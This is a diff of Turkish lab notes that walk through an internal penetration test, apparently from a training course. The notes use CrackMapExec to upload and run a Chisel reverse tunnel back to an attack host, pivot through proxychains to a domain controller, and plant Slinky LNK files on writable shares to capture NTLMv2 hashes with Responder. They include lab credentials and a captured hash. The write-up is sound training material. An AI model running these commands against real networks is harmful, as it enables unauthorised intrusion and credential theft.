+İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:
+
 ![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)
 
-DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir tünel kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.
+DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.
 
 
 ### Set Up the Tunnel
-Tünelimizi kurmak için Chisel kullanacağız. Release'e gidelim ve tehlikeye atılmış makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:
 
-7. Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:
+Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:
 
+*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:
 
 ### Chisel - Reverse Tunnel
-![Pasted image 20241202142208.png](/img/user/resimler/Pasted%20image%2020241202142208.png)
 
-8. Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:
+```
+wget
+https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_l
+inux_amd64.gz -O chisel.gz -q
+
+gunzip -d chisel.gz
+
+chmod +x chisel
+
+./chisel server --reverse
+
+2022/11/06 10:57:00 server: Reverse tunnelling enabled
+2022/11/06 10:57:00 server: Fingerprint
+CelKxt2EsL1SUFnvo634FucIOPqlFKQJi8t/aTjRfWo=
+2022/11/06 10:57:00 server: Listening on http://0.0.0.0:8080
+```
+
+
+*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:
 
 
 ### Upload Chisel
-![Pasted image 20241202142243.png](/img/user/resimler/Pasted%20image%2020241202142243.png)
-![Pasted image 20241202142251.png](/img/user/resimler/Pasted%20image%2020241202142251.png)
 
-9. CrackMapExec komut yürütme seçeneği -x'i kullanarak Chisel sunucumuza bağlanmak için chisel.exe dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)
+```
+wget
+https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_w
+indows_amd64.gz -O chisel.exe.gz -q
+
+gunzip -d chisel.exe.gz
+
+crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! --put-file
+./chisel.exe \\Windows\\Temp\\chisel.exe
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
+(SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
+SMB 10.129.204.133 445 MS01 [*] Copy ./chisel.exe
+to \Windows\Temp\chisel.exe
+SMB 10.129.204.133 445 MS01 [+] Created file
+./chisel.exe on \\C$\\Windows\Temp\chisel.exe
+
+```
 
 
-### Chisel Sunucusuna Bağlanın
-![Pasted image 20241202142344.png](/img/user/resimler/Pasted%20image%2020241202142344.png)
-Bu terminaldeki komut, hedef makinedeki Chisel işlemini durdurduğumuzda bitecektir. Bunu bu bölümün ilerleyen kısımlarında yapacağız.
+* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)
 
-Saldırı hostumuzda, Chisel sunucusunda bir istemciden bağlantı aldığımızı ve tünelimizi başlattığımızı gösteren yeni bir satır görmeliyiz.
 
+### Connect to the Chisel Server
+
+```
+crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
+(SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
+```
+
+Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.
+
+**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.
 
 ### Chisel Receiving Session No. 1
-![Pasted image 20241202142609.png](/img/user/resimler/Pasted%20image%2020241202142609.png)
+
+```
+./chisel server --reverse
+<SNIP>
+2022/11/06 10:57:54 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks:
+Listening
+
+```
 
 TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:
 
 
 ### Check Listening Port
-![Pasted image 20241202142654.png](/img/user/resimler/Pasted%20image%2020241202142654.png)
 
-10. Proxyychains'i Chisel varsayılan portu TCP 1080'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne socks5 127.0.0.1 1080'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:
+```
+netstat -lnpt | grep 1080
+(Not all processes could be identified, non-owned process info
+will not be shown, you would have to be root to see it all.)
+tcp 0 0 127.0.0.1:1080 0.0.0.0:* LISTEN
+446306/./chisel
+```
+
+* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:
 
 
 ### Configure Proxychains
-![Pasted image 20241202142722.png](/img/user/resimler/Pasted%20image%2020241202142722.png)
 
-11. Artık 172.16.1.10 IP'sine ulaşmak için Proxychains aracılığıyla CrackMapExec'i kullanabiliriz:
+```
+cat /etc/proxychains.conf
+<SNIP>
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 1080
+```
+
+* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:
 
 ### CrackMapExec'in Proxychains ile Test Edilmesi
-![Pasted image 20241202142758.png](/img/user/resimler/Pasted%20image%2020241202142758.png)
-![Pasted image 20241202142811.png](/img/user/resimler/Pasted%20image%2020241202142811.png)
 
-Proxychains çıktısını konsoldan kaldırmak için Proxychains4 ve quiet -q seçeneğini kullanabiliriz:
+```
+proxychains crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
 
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
+OK
+[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
+OK
+[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:135 ...
+OK
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
+OK
+[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
+OK
+SMB 172.16.1.10 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 172.16.1.10 445 DC01 [+] Enumerated shares
+SMB 172.16.1.10 445 DC01 Share
+Permissions Remark
+SMB 172.16.1.10 445 DC01 ----- ------
+----- ------
+SMB 172.16.1.10 445 DC01 ADMIN$ READ
+Remote Admin
+SMB 172.16.1.10 445 DC01 C$
+READ,WRITE Default share
+SMB 172.16.1.10 445 DC01 carlos
+SMB 172.16.1.10 445 DC01 D$
+READ,WRITE Default share
+SMB 172.16.1.10 445 DC01 david
+SMB 172.16.1.10 445 DC01 IPC$ READ
+Remote IPC
+SMB 172.16.1.10 445 DC01 IT
+READ,WRITE
+SMB 172.16.1.10 445 DC01 john
+SMB 172.16.1.10 445 DC01 julio
+SMB 172.16.1.10 445 DC01 linux01
+READ,WRITE
+SMB 172.16.1.10 445 DC01 NETLOGON READ
+Logon server share
+SMB 172.16.1.10 445 DC01 svc_workstations
+SMB 172.16.1.10 445 DC01 SYSVOL READ
+Logon server share
+```
+
+
+Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:
 
 ### Quiet Seçeneği ile Proxychains4
 
-![Pasted image 20241202142908.png](/img/user/resimler/Pasted%20image%2020241202142908.png)
-![Pasted image 20241202142939.png](/img/user/resimler/Pasted%20image%2020241202142939.png)
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
+--shares
+
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 172.16.1.10 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 172.16.1.10 445 DC01 [+] Enumerated shares
+SMB 172.16.1.10 445 DC01 Share
+Permissions Remark
+SMB 172.16.1.10 445 DC01 ----- ------
+----- ------
+SMB 172.16.1.10 445 DC01 ADMIN$ READ
+Remote Admin
+SMB 172.16.1.10 445 DC01 C$
+READ,WRITE Default share
+SMB 172.16.1.10 445 DC01 carlos
+SMB 172.16.1.10 445 DC01 D$
+READ,WRITE Default share
+SMB 172.16.1.10 445 DC01 david
+SMB 172.16.1.10 445 DC01 IPC$ READ
+Remote IPC
+SMB 172.16.1.10 445 DC01 IT
+READ,WRITE
+SMB 172.16.1.10 445 DC01 john
+SMB 172.16.1.10 445 DC01 julio
+SMB 172.16.1.10 445 DC01 linux01
+READ,WRITE
+SMB 172.16.1.10 445 DC01 NETLOGON READ
+Logon server share
+SMB 172.16.1.10 445 DC01 svc_workstations
+SMB 172.16.1.10 445 DC01 SYSVOL READ
+Logon server share
+```
 
 Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.
 
 
 ### Killing Chisel on the Target Machine
-İşimiz bittiğinde, Chisel sürecini öldürmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için -X seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız Stop-Process - Name chisel -Force . Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.
+
+İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.
 
 
 ### Kill the Chisel Client
-![Pasted image 20241202143058.png](/img/user/resimler/Pasted%20image%2020241202143058.png)
-![Pasted image 20241202143104.png](/img/user/resimler/Pasted%20image%2020241202143104.png)
 
-Bunu yaptıktan sonra, Chisel istemci komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:
+```
+crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -X "StopProcess -Name chisel -Force"
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
+(SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
+SMB 10.129.204.133 445 MS01 [+] Executed command
+```
+
+Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:
 
 
-### Chisel'ı Durmaya Zorladıktan Sonra Terminal Sonu
-![Pasted image 20241202143340.png](/img/user/resimler/Pasted%20image%2020241202143340.png)
+### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması
+
+```
+crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x
+"C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
+(SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
+SMB 10.129.204.133 445 MS01 [+] Executed command
+SMB 10.129.204.133 445 MS01 2022/11/07 06:26:10
+client: Connecting to ws://10.10.14.33:8080
+SMB 10.129.204.133 445 MS01 2022/11/07 06:26:11
+client: Connected (Latency 125.6629ms)
+```
 
 Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.
 
 
-### Closing Chisel on Our Attack Host
-![Pasted image 20241202143427.png](/img/user/resimler/Pasted%20image%2020241202143427.png)
+### Attack Host Üzerinde Chisel'i Kapatma
+
+```
+./chisel server --reverse
+2022/12/08 16:43:17 server: Reverse tunnelling enabled
+2022/12/08 16:43:17 server: Fingerprint
+NVnBjtu2DPIuQPxLU0YdcyZhRKc+Myi3ojPzo0T2frQ=
+2022/12/08 16:43:17 server: Listening on http://0.0.0.0:8080
+2022/12/08 16:44:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks:
+Listening
+^C
+
+```
 
 
 ### Sunucu olarak Windows ve Client olarak Linux
-Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu istemci olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için server --socks5 seçeneğini kullanacağız.
+
+Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.
 
 
 ### Chisel'i Hedef Makinede Sunucu Olarak Başlatma
-![Pasted image 20241202143533.png](/img/user/resimler/Pasted%20image%2020241202143533.png)
 
-Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra socks seçeneğini kullanmamız gerekiyor.
+```
+crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x
+"C:\Windows\Temp\chisel.exe server --socks5"
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
+(SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
+```
+
+Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.
 
 
-### Saldırı Hostumuzdan Chisel Sunucusuna Bağlanma
-![Pasted image 20241202143602.png](/img/user/resimler/Pasted%20image%2020241202143602.png)
+### Attack Hostumuzdan Chisel Sunucusuna Bağlanma
+
+```
+sudo chisel client 10.129.204.133:8080 socks
+2022/11/22 06:56:01 client: Connecting to ws://10.129.204.133:8080
+2022/11/22 06:56:01 client: tun: proxy#127.0.0.1:1080=>socks: Listening
+2022/11/22 06:56:02 client: Connected (Latency 124.871246ms)
+```
 
 Şimdi Proxychains'i tekrar kullanabiliriz:
 
+### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma
 
-### Internal Network'e Bağlanmak için Proxy Zincirlerini Kullanma
-![Pasted image 20241202143710.png](/img/user/resimler/Pasted%20image%2020241202143710.png)
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
 
-İlerleyen bölümlerde, diğer ağlara ulaşmak için CrackMapExec ve Proxychains kullanacağız.
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 172.16.1.10 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 172.16.1.10 445 DC01 [+] Enumerated shares
+SMB 172.16.1.10 445 DC01 Share
+Permissions Remark
+SMB 172.16.1.10 445 DC01 ----- ------
+----- ------
+SMB 172.16.1.10 445 DC01 ADMIN$ READ
+Remote Admin
+<SNIP>
 
+```
 
-### Hash'leri Çalmak
-Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola karmalarının çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.
+Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.
 
-Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu karma, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.
+İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.
+
+---
+
+### Stealing Hashes
+
+Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.
+
+Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.
 
 Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.
 
-NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için Kırmızı Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.
+NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.
 
 
 ### Slinky Modülü
-Slinky, @byt3bl33d3r tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge özniteliğine sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge özniteliği sunucumuza giden bir UNC yolu içerdiği için Responder kullanarak NTLMv2 hash'ini alacağız.
 
-Modülün SERVER ve NAME olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı CLEANUP seçeneği vardır.
+`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.
+
+Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.
 
 
 ### Slinky Module Options
-![Pasted image 20241202171602.png](/img/user/resimler/Pasted%20image%2020241202171602.png)
-SERVER, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. NAME seçeneği kısayol dosyasına bir isim atar, CLEANUP ise işimiz bittiğinde kısayolu silmek içindir.
+
+```
+crackmapexec smb -M slinky --options
+[*] slinky module options:
+ SERVER IP of the SMB server
+ NAME LNK file nametest
+ CLEANUP Cleanup (choices: True or False)
+
+```
+
+`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.
 
 
-### Connecting using Chisel
-Bu alıştırma için lokal erişimi simüle edeceğiz ve dahili ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra dahili ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**
+### Chisel kullanarak bağlama
+
+Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**
 
 
 ### Hedef Makine Chisel Sunucusuna Bağlanma
-![Pasted image 20241202171723.png](/img/user/resimler/Pasted%20image%2020241202171723.png)
+
+```
+sudo chisel client 10.129.204.133:8080 socks
+2022/11/22 07:15:52 client: Connecting to ws://10.129.204.133:8080
+2022/11/22 07:15:52 client: tun: proxy#127.0.0.1:1080=>socks: Listening
+2022/11/22 07:15:53 client: Connected (Latency 125.541725ms)
+
+```
 
 
 ### NTLMv2 Hash'lerinin Çalınması
-İlk olarak, -- shares seçeneğini kullanarak grace kullanıcısının WRITE ayrıcalıklarına sahip olduğu bir paylaşım bulalım:
+İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:
 
 ### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma
-![Pasted image 20241202171807.png](/img/user/resimler/Pasted%20image%2020241202171807.png)
-![Pasted image 20241202171817.png](/img/user/resimler/Pasted%20image%2020241202171817.png)
 
-Gördüğümüz gibi, grace HR ve IT-Tools paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir LNK dosyası yazmak için Slinky modülünü kullanabiliriz. SERVER=10.10.14.33 seçeneğini, saldırı hostumuzun tun0 ağına karşılık gelen IP adresini ve LNK dosyasına atadığımız dosya adı olan NAME=important seçeneğini kullanacağız.
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
+
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 172.16.1.10 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 172.16.1.10 445 DC01 [+] Enumerated shares
+SMB 172.16.1.10 445 DC01 Share
+Permissions Remark
+SMB 172.16.1.10 445 DC01 ----- ------
+----- ------
+SMB 172.16.1.10 445 DC01 ADMIN$
+Remote Admin
+SMB 172.16.1.10 445 DC01 C$
+Default share
+SMB 172.16.1.10 445 DC01 D$
+Default share
+SMB 172.16.1.10 445 DC01 flag READ
+SMB 172.16.1.10 445 DC01 HR
+READ,WRITE
+SMB 172.16.1.10 445 DC01 IPC$ READ
+Remote IPC
+SMB 172.16.1.10 445 DC01 IT
+SMB 172.16.1.10 445 DC01 IT-Tools
+READ,WRITE
+SMB 172.16.1.10 445 DC01 NETLOGON READ
+Logon server share
+SMB 172.16.1.10 445 DC01 SYSVOL READ
+Logon server share
+
+```
+
+
+Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 
+
+**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.
 
 
 ### Using Slinky
-![Pasted image 20241202171914.png](/img/user/resimler/Pasted%20image%2020241202171914.png)
-![Pasted image 20241202171923.png](/img/user/resimler/Pasted%20image%2020241202171923.png)
+
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
+-M slinky -o SERVER=10.10.14.33 NAME=important
+
+[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 172.16.1.10 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SLINKY 172.16.1.10 445 DC01 [+] Found writable
+share: HR
+SLINKY 172.16.1.10 445 DC01 [+] Created LNK file
+on the HR share
+SLINKY 172.16.1.10 445 DC01 [+] Found writable
+share: IT-Tools
+SLINKY 172.16.1.10 445 DC01 [+] Created LNK file
+on the IT-Tools share
+```
+
+
 ![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)
 
-Not: CrackMapExec genellikle opsec güvenli olarak kabul edilir çünkü her şey ya bellekte çalıştırılır, WinAPI çağrıları kullanılarak ağ üzerinden numaralandırılır ya da yerleşik Windows araçları/özellikleri kullanılarak yürütülür. Bir modül bu gereksinimleri karşılamadığında bir uyarı alacağız. Slinky modülü opsec güvenli olmayan modüllere bir örnektir. Devam etmeden önce bir uyarı alacağız.
+**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.
 
-LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. Responder'ın nasıl kullanılacağı hakkında daha fazla bilgi edinmek için Attacking Common Services modülündeki Attacking SMB bölümüne göz atabiliriz.
+Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.
+
+LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 
 
 
 ### Starting Responder
-![Pasted image 20241202172026.png](/img/user/resimler/Pasted%20image%2020241202172026.png)
-![Pasted image 20241202172032.png](/img/user/resimler/Pasted%20image%2020241202172032.png)
 
-Not: Hash'i yakalamak için Responder.conf dosyasında SMB seçeneği Açık olmalıdır.
+```
+sudo responder -I tun0
+ __
+ .----.-----.-----.-----.-----.-----.--| |.-----.----.
+ | _| -__|__ --| _ | _ | | _ || -__| _|
+ |__| |_____|_____| __|_____|__|__|_____||_____|__|
+ |__|
+ NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+ Author: Laurent Gaffie ([email protected])
+ To kill this script, hit CTRL-C
+<SNIP>
+[+] Listening for events...
+[SMB] NTLMv2-SSP Client : 10.129.204.133
+[SMB] NTLMv2-SSP Username : INLANEFREIGHT\julio
+[SMB] NTLMv2-SSP Hash :
+julio::INLANEFREIGHT:6ab02caa0926e456:433DB600379844344ED4D3A073CAF995:010
+1000000000000004A2BBF8808D901D4CC1FFAB74CC23F00000000020008004400320058005
+60001001E00570049004E002D0030005500510058004E00570046004100550030004400040
+03400570049004E002D0030005500510058004E005700460041005500300044002E0044003
+200580056002E004C004F00430041004C0003001400440<SNIP>
+```
 
-NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir NTLM Relay yapabiliriz. Bunu kırmak için, ASREPRoast ve Kerberoasting ile yaptığımız gibi Hashcat mod 5600'ü kullanabiliriz. NTLM Relay'e odaklanalım.
+Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.
+
+NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
 
 
 ### **NTLM Relay**
-Diğer bir çözüm ise NTLMv2 özetini doğrudan SMB İmzalamanın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB İmzalama çok önemlidir çünkü bir bilgisayarda SMB İmzalama etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara aktarım yapamayız. SMB İmzalama'nın devre dışı bırakıldığı hedeflerin bir listesini almak için --gen-relay-list seçeneğini kullanabiliriz.
 
